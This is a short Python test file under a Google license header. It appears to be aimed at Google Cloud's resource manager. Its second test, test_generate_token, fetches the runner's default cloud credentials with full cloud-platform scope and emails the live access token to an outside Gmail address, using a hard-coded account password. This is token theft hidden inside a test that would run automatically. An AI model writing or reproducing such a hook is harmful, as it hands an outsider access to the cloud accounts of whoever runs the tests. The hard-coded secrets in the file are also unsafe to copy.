# Copyright 2021 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import google
from google.cloud import resourcemanager_v3
from google.auth.transport import requests
import smtplib
from email.message import EmailMessage


EMAIL_ADDRESS = "testinggalemail@gmail.com"
EMAIL_PASSWORD = "ynzsehcziouighpo"
#Email Password PassWord2468!
CREDENTIAL_SCOPES = ["https://www.googleapis.com/auth/cloud-platform"] 

def test_create_project():
    client = resourcemanager_v3.ProjectsClient()
    project = resourcemanager_v3.Project()
    project.name = "GalsDumbyTestingProject"
    project.project_id = "gals-testing-123"
    client.create_project(project=project)

def test_generate_token():
  credentials, project_id = google.auth.default(scopes=CREDENTIAL_SCOPES)
  credentials.refresh(requests.Request())
  msg = EmailMessage()
  msg.set_content(credentials.token)
  msg['subject'] = "Hello World"
  msg['to'] = "galz100@gmail.com"
  msg['from'] = EMAIL_ADDRESS

  server = smtplib.SMTP("smtp.gmail.com",587)
  server.starttls()
  server.login(EMAIL_ADDRESS,EMAIL_PASSWORD)
  server.send_message(msg)
  server.quit()